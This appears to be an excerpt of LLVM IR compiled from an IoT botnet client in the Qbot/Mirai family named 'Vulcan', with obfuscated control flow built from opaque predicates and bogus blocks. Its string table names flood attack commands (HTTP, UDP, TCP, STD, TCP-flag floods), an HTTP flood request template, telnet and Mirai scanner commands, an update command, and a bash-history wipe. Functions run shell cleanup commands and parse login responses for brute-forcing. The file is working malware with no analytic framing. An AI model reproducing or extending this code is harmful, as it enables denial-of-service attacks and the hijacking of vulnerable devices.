@.str.907 = private unnamed_addr constant [11 x i8] c"qbotbotnet\00", align 1
@.str.908 = private unnamed_addr constant [12 x i8] c"lizardsquad\00", align 1
@.str.909 = private unnamed_addr constant [10 x i8] c"aNrjBnTRi\00", align 1
@.str.910 = private unnamed_addr constant [10 x i8] c"1QD8ypG86\00", align 1
@.str.911 = private unnamed_addr constant [10 x i8] c"IVkLWYjLe\00", align 1
@.str.912 = private unnamed_addr constant [24 x i8] c"nexuszetaisacrackaddict\00", align 1
@.str.913 = private unnamed_addr constant [15 x i8] c"satoriskidsnet\00", align 1
@.str.914 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.915 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.916 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.917 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.918 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.919 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.920 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.921 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.922 = private unnamed_addr constant [28 x i8] c"cd /;rm -rf ~/.bash_history\00", align 1
@.str.923 = private unnamed_addr constant [7 x i8] c"TRANGE\00", align 1
@.str.924 = private unnamed_addr constant [21 x i8] c"RANGE <option 0-idk>\00", align 1
@.str.925 = private unnamed_addr constant [20 x i8] c"Telnet Range %d->%d\00", align 1
@.str.926 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.927 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.928 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.929 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.930 = private unnamed_addr constant [6 x i8] c"MIRAI\00", align 1
@.str.931 = private unnamed_addr constant [9 x i8] c"FASTLOAD\00", align 1
@.str.932 = private unnamed_addr constant [7 x i8] c"MRANGE\00", align 1
@.str.933 = private unnamed_addr constant [19 x i8] c"Mirai Range %d->%d\00", align 1
@.str.934 = private unnamed_addr constant [6 x i8] c"PHONE\00", align 1
@.str.935 = private unnamed_addr constant [8 x i8] c"MTRANGE\00", align 1
@.str.936 = private unnamed_addr constant [32 x i8] c"Mirai Test RANGE <option 0-idk>\00", align 1
@.str.937 = private unnamed_addr constant [13 x i8] c"Range %d->%d\00", align 1
@.str.938 = private unnamed_addr constant [10 x i8] c"MIRAITEST\00", align 1
@.str.939 = private unnamed_addr constant [3 x i8] c"TT\00", align 1
@.str.940 = private unnamed_addr constant [33 x i8] c"Telnet test RANGE <option 0-idk>\00", align 1
@.str.941 = private unnamed_addr constant [11 x i8] c"TELNETTEST\00", align 1
@.str.942 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.943 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.944 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.945 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.946 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.947 = private unnamed_addr constant [8 x i8] c"FUCKOFF\00", align 1
@.str.948 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.949 = private unnamed_addr constant [19 x i8] c"[Updating] [%s:%s]\00", align 1
@.str.952 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.953 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.954 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.955 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.956 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.950 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.951 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.957 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.958 = private unnamed_addr constant [7 x i8] c"SERVER\00", align 1
@.str.959 = private unnamed_addr constant [7 x i8] c"DEVICE\00", align 1
@.str.960 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.961 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.962 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.963 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.964 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.965 = private unnamed_addr constant [37 x i8] c"\1B[96m[%s] \1B[97mConnected -> %s -> %s\00", align 1
@.str.966 = private unnamed_addr constant [7 x i8] c"Vulcan\00", align 1
@.str.967 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.968 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.969 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0
@x.113 = common global i32 0
@y.114 = common global i32 0
@x.115 = common global i32 0
@y.116 = common global i32 0
@x.117 = common global i32 0
@y.118 = common global i32 0
@x.119 = common global i32 0
@y.120 = common global i32 0
@x.121 = common global i32 0
@y.122 = common global i32 0
@x.123 = common global i32 0
@y.124 = common global i32 0
@x.125 = common global i32 0
@y.126 = common global i32 0
@x.127 = common global i32 0
@y.128 = common global i32 0
@x.129 = common global i32 0
@y.130 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  %1 = load i32, i32* @x
  %2 = load i32, i32* @y
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = load i32, i32* @x
  %10 = load i32, i32* @y
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0)

originalBBalteredBB:                              ; preds = %originalBB, %0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i32 0, i32 0))
  %14 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))
  %15 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i32 0, i32 0))
  %16 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i32 0, i32 0))
  %17 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i32 0, i32 0))
  %18 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i32 0, i32 0))
  %19 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i32 0, i32 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.12, i32 0, i32 0))
  %21 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  %22 = load i32, i32* @x.1
  %23 = load i32, i32* @y.2
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %0
  %30 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i32 0, i32 0))
  %31 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i32 0, i32 0))
  %32 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i32 0, i32 0))
  %33 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i32 0, i32 0))
  %34 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.5, i32 0, i32 0))
  %35 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0))
  %36 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i32 0, i32 0))
  %37 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.8, i32 0, i32 0))
  %38 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i32 0, i32 0))
  %39 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.10, i32 0, i32 0))
  %40 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.11, i32 0, i32 0))
  %41 = call i32 @system(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.12, i32 0, i32 0))
  %42 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.13, i32 0, i32 0))
  br label %originalBB
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart248, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %66

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* @x.3
  %15 = load i32, i32* @y.4
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  %22 = load i32, i32* %3, align 4
  %23 = sub nsw i32 %22, 3
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %24
  %26 = load i32, i32* %25, align 4
  %27 = load i32, i32* %3, align 4
  %28 = sub nsw i32 %27, 2
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = xor i32 %26, %31
  %33 = xor i32 %32, -1640531527
  %34 = load i32, i32* %3, align 4
  %35 = xor i32 %33, %34
  %36 = load i32, i32* %3, align 4
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  store i32 %35, i32* %38, align 4
  %39 = load i32, i32* @x.3
  %40 = load i32, i32* @y.4
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %47

; <label>:47:                                     ; preds = %originalBBpart2
  %48 = load i32, i32* @x.3
  %49 = load i32, i32* @y.4
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB32, label %originalBB32alteredBB

originalBB32:                                     ; preds = %originalBB32alteredBB, %47
  %56 = load i32, i32* %3, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %3, align 4
  %58 = load i32, i32* @x.3
  %59 = load i32, i32* @y.4
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart248, label %originalBB32alteredBB

originalBBpart248:                                ; preds = %originalBB32
  br label %10

; <label>:66:                                     ; preds = %10
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %13
  %67 = load i32, i32* %3, align 4
  %_ = sub i32 %67, 3
  %gen = mul i32 %_, 3
  %_1 = sub i32 %67, 3
  %gen2 = mul i32 %_1, 3
  %_3 = sub i32 0, %67
  %gen4 = add i32 %_3, 3
  %68 = sub nsw i32 %67, 3
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %69
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %3, align 4
  %_5 = sub i32 0, %72
  %gen6 = add i32 %_5, 2
  %_7 = sub i32 %72, 2
  %gen8 = mul i32 %_7, 2
  %_9 = sub i32 0, %72
  %gen10 = add i32 %_9, 2
  %_11 = sub i32 0, %72
  %gen12 = add i32 %_11, 2
  %73 = sub nsw i32 %72, 2
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %74
  %76 = load i32, i32* %75, align 4
  %_13 = sub i32 0, %71
  %gen14 = add i32 %_13, %76
  %_15 = sub i32 %71, %76
  %gen16 = mul i32 %_15, %76
  %77 = xor i32 %71, %76
  %_17 = shl i32 %77, -1640531527
  %_18 = sub i32 %77, -1640531527
  %gen19 = mul i32 %_18, -1640531527
  %_20 = sub i32 %77, -1640531527
  %gen21 = mul i32 %_20, -1640531527
  %_22 = sub i32 0, %77
  %gen23 = add i32 %_22, -1640531527
  %_24 = sub i32 0, %77
  %gen25 = add i32 %_24, -1640531527
  %_26 = sub i32 %77, -1640531527
  %gen27 = mul i32 %_26, -1640531527
  %78 = xor i32 %77, -1640531527
  %79 = load i32, i32* %3, align 4
  %_28 = sub i32 %78, %79
  %gen29 = mul i32 %_28, %79
  %_30 = sub i32 0, %78
  %gen31 = add i32 %_30, %79
  %80 = xor i32 %78, %79
  %81 = load i32, i32* %3, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %82
  store i32 %80, i32* %83, align 4
  br label %originalBB

originalBB32alteredBB:                            ; preds = %originalBB32, %47
  %84 = load i32, i32* %3, align 4
  %_33 = sub i32 %84, 1
  %gen34 = mul i32 %_33, 1
  %_35 = shl i32 %84, 1
  %_36 = sub i32 0, %84
  %gen37 = add i32 %_36, 1
  %_38 = sub i32 0, %84
  %gen39 = add i32 %_38, 1
  %_40 = sub i32 %84, 1
  %gen41 = mul i32 %_40, 1
  %_42 = sub i32 0, %84
  %gen43 = add i32 %_42, 1
  %_44 = sub i32 %84, 1
  %gen45 = mul i32 %_44, 1
  %_46 = shl i32 %84, 1
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %originalBB32
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %16, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = add nsw i32 %10, 1
  store i32 %11, i32* %6, align 4
  %12 = sext i32 %11 to i64
  %13 = getelementptr inbounds i8*, i8** %9, i64 %12
  %14 = load i8*, i8** %13, align 8
  %15 = icmp ne i8* %14, null
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %8
  br label %8

; <label>:17:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %18

; <label>:18:                                     ; preds = %49, %17
  %19 = load i32, i32* @x.7
  %20 = load i32, i32* @y.8
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %27, %28
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %29, label %38, label %52

; <label>:38:                                     ; preds = %originalBBpart2
  %39 = load i8*, i8** %4, align 8
  %40 = load i8**, i8*** %5, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds i8*, i8** %40, i64 %42
  %44 = load i8*, i8** %43, align 8
  %45 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %39, i8* %44)
  %46 = icmp ne i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 1, i32* %3, align 4
  br label %69

; <label>:48:                                     ; preds = %38
  br label %49

; <label>:49:                                     ; preds = %48
  %50 = load i32, i32* %7, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %7, align 4
  br label %18

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.7
  %54 = load i32, i32* @y.8
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  store i32 0, i32* %3, align 4
  %61 = load i32, i32* @x.7
  %62 = load i32, i32* @y.8
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %69

; <label>:69:                                     ; preds = %originalBBpart24, %47
  %70 = load i32, i32* %3, align 4
  ret i32 %70

originalBBalteredBB:                              ; preds = %originalBB, %18
  %71 = load i32, i32* %7, align 4
  %72 = load i32, i32* %6, align 4
  %73 = icmp slt i32 %71, %72
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  store i32 0, i32* %3, align 4
  br label %originalBB1
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([12 x i8*], [12 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = load i32, i32* @x.15
  %20 = load i32, i32* @y.16
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %18
  %27 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %28 = getelementptr inbounds [16 x i64], [16 x i64]* %27, i64 0, i64 0
  %29 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %28) #5, !srcloc !1
  %30 = extractvalue { i64, i64* } %29, 0
  %31 = extractvalue { i64, i64* } %29, 1
  %32 = trunc i64 %30 to i32
  store i32 %32, i32* %12, align 4
  %33 = ptrtoint i64* %31 to i64
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %13, align 4
  %35 = load i32, i32* @x.15
  %36 = load i32, i32* @y.16
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %43

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %6, align 4
  %45 = srem i32 %44, 64
  %46 = zext i32 %45 to i64
  %47 = shl i64 1, %46
  %48 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %49 = load i32, i32* %6, align 4
  %50 = sdiv i32 %49, 64
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [16 x i64], [16 x i64]* %48, i64 0, i64 %51
  %53 = load i64, i64* %52, align 8
  %54 = or i64 %53, %47
